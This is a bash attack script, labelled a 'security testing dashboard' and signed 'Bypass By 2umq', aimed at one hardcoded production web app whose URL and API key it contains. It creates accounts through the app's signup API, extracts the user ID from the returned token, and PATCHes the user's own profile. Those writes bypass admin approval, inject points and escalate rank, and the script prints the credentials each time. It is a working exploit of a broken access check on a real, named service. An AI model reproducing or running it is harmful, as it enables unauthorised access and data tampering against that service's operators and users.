#!/bin/bash
TARGET="https://c--d5677b84-1ed1-4f77-8a0b-9c5067bdd35c-prod.lovable.cloud"
API_KEY="sb_publishable_PriJ4q0hFBegVn89nNZmZg_rlOon6dy"

show_banner() {
  clear
  echo -e "\033[1;36m"
  cat << "BANNER"
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#==-:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=:===.-%# %@@@@@@@@@@@@@@@@@@@@@@ +=.=.=@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.=--::=:-:@        +@@@@@@@@@@@%    === --.=.@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@* =.::- -          @          =====.:.==:@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*-
@@@@@@@@@@@@@@@@@@@+    %*                                                     :@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@*                                -==-.                        *@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@.                          ,========-:=.                      @@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@% +                     :+++====:===@@==========-=            =@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@.@@              .-===================@@@*===========++=:.%=-  .@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@                - -=========@@*@+==========:=@  .@@@# @@@@@@@@@
@@@@@@@@@@@@@@@@@@@:                   ===:====-==++=======--:====. @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@+                   -==================-:=====-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@*                +=+==:::-======@==============+: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@.                -=====-.:===%@@===:===:==========@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@:                -=======:=====*@@@+=========-====-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@.               :.======-======@@@@@@========-===-=:.-@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@                  :.-=======@@@@@@@@=========:.=:: @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@ @                -.:=====---=%%#%####%=--.. . . @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@#-                :.-:--===#####+*###:== -==. .:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@%                    =.:===   #*########*   .=-+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@                     ---..:===##*+**###+=:--==.+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@                      =====-.-=####*#**###*===. -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@#             @         =========#-**##*=#*===-:=. :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@  %  @@                  ==================.=========: -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@+ @ *-                   =============================-:@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@: @                      .+%===================:===========================@@@@@@@@@@
@@@@@@@@@@@@@@@@@@     +               @%@@@-===============-========================= .@@@@@@@@@@
@@@@@@@@@@@@@@@@@@     =@   @ @.*. =======================.==========================:==++=-: -@@@@
@@@@@@@@@@@@@@@@@@#.@-  + +:++-=.===========================:======================::=+++++++=====
@@@@@@@@@@@@@@@@@%--++ =-+= =++++:====:====.===-. -=================:;.-===========:+++++++ ++@@@@
@@@@@@@@@@@@@@@@@+=++++++++++:+++++++++++==---====.=-. -==========:.-================++++++++++:+++
@@@@@@@*=++++++++++++++++++++++===========---.====.:. -=========::==================+++++++++ +:++
@@@@@@=++++++++++++++++++++++++===-========.==============================-:========++++++++++=+++
@@@@@@=++++++++++++++++++++++++++=+========.===========================:=++++++++++=++==++
BANNER
  echo -e "\033[0m"
  echo -e "\033[1;37m             [ FTS Security Testing Dashboard ]\033[0m"
  echo -e "\033[1;35m                  [ Bypass By 2umq ]\033[0m"
  echo -e "\033[1;36m======================================================================\033[0m"
}

while true; do
  show_banner
  echo ""

  read -p "$(echo -e "\033[1;33m[?] Enter Full Name (e.g., Ghost): \033[0m")" FULL_NAME
  
  while true; do
    read -p "$(echo -e "\033[1;33m[?] Enter Email (must be @gmail.com): \033[0m")" EMAIL
    if [[ "$EMAIL" == *"@gmail.com" ]]; then
      break
    else
      echo -e "\033[1;31m[-] Error: Email must end with @gmail.com!\033[0m"
    fi
  done

  PASSWORD="Str0ng!P@ssw0rd_$(head /dev/urandom | tr -dc a-zA-Z0-9 | head -c 8)"
  echo -e "\n\033[1;36m[*] Generated Strong Password: $PASSWORD\033[0m"
  echo -e "\033[1;34m[*] Initializing attack sequence...\033[0m"

  SIGNUP=$(curl -s -X POST "$TARGET/auth/v1/signup" \
  -H "apikey: $API_KEY" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\",\"data\":{\"full_name\":\"$FULL_NAME\"}}")

  TOKEN=$(echo "$SIGNUP" | grep -oE '"access_token":"[^"]+"' | cut -d'"' -f4)

  if [ -z "$TOKEN" ]; then
    echo -e "\033[1;31m[-] Account Creation Failed! (Email exists).\033[0m"
    sleep 3
    continue 
  fi

  ID=$(echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | grep -oE '"sub":"[^"]+"' | cut -d'"' -f4 | head -c 36)
  echo -e "\033[1;32m[+] Account Created Successfully. ID: $ID\033[0m"
  echo -e "\033[1;36m======================================================================\033[0m"

  read -p "$(echo -e "\033[1;33m[?] Bypass Approval? (y/n): \033[0m")" BYPASS_ANS

  if [[ "$BYPASS_ANS" == "y" || "$BYPASS_ANS" == "Y" ]]; then
    BYPASS=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH "$TARGET/rest/v1/profiles?id=eq.$ID" \
    -H "apikey: $API_KEY" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"approval_status":"approved"}')

    if [ "$BYPASS" == "204" ] || [ "$BYPASS" == "200" ]; then
      echo -e "\033[1;31m[!] VULNERABLE: Approval Bypassed! (HTTP $BYPASS)\033[0m"
      echo -e "\033[1;33m[+] Credentials -> Email: $EMAIL | Password: $PASSWORD\033[0m"
    else
      echo -e "\033[1;32m[+] SECURE: Blocked (HTTP $BYPASS)\033[0m"
    fi
  else
    continue 
  fi

  read -p "$(echo -e "\033[1;33m[?] Points to inject (Default 500000): \033[0m")" POINTS_AMOUNT
  if [ -z "$POINTS_AMOUNT" ]; then POINTS_AMOUNT=500000; fi

  POINTS=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH "$TARGET/rest/v1/profiles?id=eq.$ID" \
  -H "apikey: $API_KEY" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"points\":$POINTS_AMOUNT}")

  if [ "$POINTS" == "204" ] || [ "$POINTS" == "200" ]; then
    echo -e "\033[1;31m[!] VULNERABLE: Points Modified! (HTTP $POINTS)\033[0m"
    echo -e "\033[1;33m[+] Credentials -> Email: $EMAIL | Password: $PASSWORD\033[0m"
  else
    echo -e "\033[1;32m[+] SECURE: Blocked (HTTP $POINTS)\033[0m"
  fi

  read -p "$(echo -e "\033[1;33m[?] Rank Level to test (Default 5): \033[0m")" RANK_LEVEL
  if [ -z "$RANK_LEVEL" ]; then RANK_LEVEL=5; fi

  RANK=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH "$TARGET/rest/v1/profiles?id=eq.$ID" \
  -H "apikey: $API_KEY" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "{\"rank_level\":$RANK_LEVEL}")

  if [ "$RANK" == "204" ] || [ "$RANK" == "200" ]; then
    echo -e "\033[1;31m[!] VULNERABLE: Rank Escalated! (HTTP $RANK)\033[0m"
    echo -e "\033[1;33m[+] Credentials -> Email: $EMAIL | Password: $PASSWORD\033[0m"
  else
    echo -e "\033[1;32m[+] SECURE: Blocked (HTTP $RANK)\033[0m"
  fi

  echo -e "\n\033[1;34m[*] Fetching Final Account Data...\033[0m"
  curl -s "$TARGET/rest/v1/profiles?id=eq.$ID&select=full_name,points,rank_level,approval_status" -H "apikey: $API_KEY" -H "Authorization: Bearer $TOKEN"
  echo -e "\n"
  
  echo -e "\033[1;36m======================================================================\033[0m"
  echo -e "\033[1;36m             [ End of Security Report - Bypass By 2umq ]\033[0m"
  echo -e "\033[1;36m======================================================================\033[0m"
  
  read -p "$(echo -e "\033[1;33m[?] Test another account? (y/n): \033[0m")" CONTINUE_ANS
  if [[ "$CONTINUE_ANS" != "y" && "$CONTINUE_ANS" != "Y" ]]; then
    break
  fi
done
